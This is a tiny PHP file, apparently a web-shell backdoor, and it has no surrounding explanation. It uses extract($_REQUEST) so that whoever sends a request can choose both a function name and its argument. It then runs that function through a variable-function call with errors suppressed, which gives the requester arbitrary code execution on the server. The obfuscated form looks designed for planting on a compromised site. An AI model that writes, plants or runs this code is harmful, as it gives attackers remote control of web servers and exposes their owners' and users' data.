<?php
extract($_REQUEST) && @$accept(stripslashes($internal)) && exit;